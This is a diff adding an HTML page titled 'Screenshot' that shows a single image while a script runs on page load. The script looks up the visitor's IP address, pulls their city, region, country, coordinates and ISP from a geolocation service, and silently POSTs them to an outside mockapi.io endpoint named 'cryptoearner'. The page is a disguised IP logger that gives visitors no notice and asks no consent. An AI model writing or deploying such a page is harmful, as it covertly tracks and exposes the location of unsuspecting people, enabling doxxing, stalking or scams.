@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Screenshot</title>
+    <script>
+        async function getIPAddressAndPost() {
+            try {
+                // Fetch the IP address from ipify
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
+                console.log('IP Address:', ipAddress);
+
+                // Fetch additional information about the IP address from ipapi
+                const ipInfoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
+                const ipInfoData = await ipInfoResponse.json();
+                console.log('IP Information:', ipInfoData);
+
+                // Post the IP address and additional information to MockAPI
+                const postResponse = await fetch('https://6677a297145714a1bd75376a.mockapi.io/cryptoearner', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        ipAddress: ipAddress,
+                        city: ipInfoData.city,
+                        region: ipInfoData.region,
+                        country: ipInfoData.country_name,
+                        latitude: ipInfoData.latitude,
+                        longitude: ipInfoData.longitude,
+                        org: ipInfoData.org
+                    })
+                });
+
+                if (postResponse.ok) {
+                    const postData = await postResponse.json();
+                    console.log('POST Response:', postData);
+                } else {
+                    console.error('Failed to send IP address to API');
+                }
+            } catch (error) {
+                console.error('Error fetching IP address or making API call:', error);
+            }
+        }
+
+        // Call the function on page load
+        window.onload = getIPAddressAndPost;
+    </script>
+</head>
+<body>
+    <img src="https://gcdnb.pbrd.co/images/NSqwd6zHbEo1.png?o=1" alt="IP Detection Image">
+</body>
+</html>
